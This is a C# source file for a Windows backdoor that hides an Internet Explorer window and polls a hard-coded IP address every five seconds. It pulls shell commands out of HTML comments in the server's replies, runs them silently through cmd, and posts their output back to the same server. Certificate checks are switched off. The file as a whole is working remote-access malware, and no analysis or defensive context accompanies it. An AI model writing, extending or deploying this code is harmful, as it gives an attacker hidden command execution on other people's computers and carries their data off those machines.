using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Net;

// C:\Windows\Microsoft.NET\Framework\v3.5\Csc.exe /noconfig /nowarn:1701,1702 /errorreport:prompt /warn:4 /reference:"C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Core.dll" /reference:"C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Data.DataSetExtensions.dll" /reference:C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Data.dll /reference:C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.dll /reference:C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Xml.dll /reference:"C:\Program Files\Reference Assemblies\Microsoft\Framework\v3.5\System.Xml.Linq.dll" /reference:obj\Release\Interop.SHDocVw.dll /debug+ /debug:full /filealign:512 /nowin32manifest /optimize+ /out:obj\Release\Comb64.exe /target:exe Program.cs Properties\AssemblyInfo.cs
namespace ConsoleApplication1
{
    public static class dataTransfer
    {
        public static string data = string.Empty;
    }
    class EventHandlers
    {
        public void OnNavigateComplete2(object pDisp, ref object url)
        {
            var IE = (SHDocVw.InternetExplorer)pDisp;
            mshtml.HTMLDocumentClass whatever = (mshtml.HTMLDocumentClass)IE.Document;
            string thissource = whatever.body.outerHTML;
            //Console.WriteLine("THIS is OUTERHTML {0}", whatever.body.outerHTML);
            string output = string.Empty;
            string[] temp = System.Text.RegularExpressions.Regex.Split(thissource, "-->");
            foreach (string s in temp)
            {
                string str = string.Empty;
                if (s.Contains("<!--"))
                {
                    str = s.Substring(s.IndexOf("<!--") + 4);
                }
                if (str.Trim() != string.Empty)
                {
                    output = output + str.Trim();
                }
            }
            Console.WriteLine("[CMD] {0}", output);
            if (output == string.Empty)
            {
                return;
            }
            var procStart = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + output);
            procStart.CreateNoWindow = true;
            procStart.RedirectStandardOutput = true;
            procStart.RedirectStandardError = true;
            procStart.UseShellExecute = false;
            var proc = new System.Diagnostics.Process();
            proc.StartInfo = procStart;
            proc.Start();
            var result = proc.StandardOutput.ReadToEnd();
            var resulterr = proc.StandardError.ReadToEnd();
            dataTransfer.data = string.Empty;
            if (result != string.Empty)
            {
                //Console.WriteLine("[OUT: {0}]\n{1}", output, result);
                dataTransfer.data += result;
            }
            if (resulterr != string.Empty)
            {
                //Console.WriteLine("[ERR: {0}]\n{1}", output, resulterr);
                dataTransfer.data += resulterr;
            }
            if (result == string.Empty && resulterr == string.Empty)
            {
                //Console.WriteLine("[No OUT No ERR]");
            }
        }
    }

    class Program
    {
        private static Random random = new Random((int)DateTime.Now.Ticks);
        private static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }
        static void Main(string[] args)
        {
            EventHandlers e = new EventHandlers();
            SHDocVw.InternetExplorer IE = new SHDocVw.InternetExplorer();
            IE.NavigateComplete2 += new SHDocVw.DWebBrowserEvents2_NavigateComplete2EventHandler(e.OnNavigateComplete2);
            if (args.Length > 0)
            {
                if (args[0] == "d")
                {
                    IE.Visible = true;
                }
                else
                {
                    IE.Visible = false;
                }
            }
            else
            {
                IE.Visible = false;
            }
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            //netassembly = GetAssembly(System.Net.Configuration.SettingsSection);
            while (true)
            {
                ASCIIEncoding Encode = new ASCIIEncoding();
                string uncooked = "etag=" + RandomString(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 1))) + "&data=" + dataTransfer.data;
                uncooked += "\n\n";
                object postData = Encode.GetBytes(uncooked);
                object Empty = 0;
                object browserFlags = 14; // no history, no read cache, no write cache
                object URL = "https://210.51.57.156/default.php";
                object postHeader = "Content-Type: application/x-www-form-urlencoded\r\n";
                IE.Navigate2(ref URL, ref browserFlags, ref Empty, ref postData, ref postHeader);
                System.Threading.Thread.Sleep(5000);
            }
            //IE.Quit();
        }
    }
}
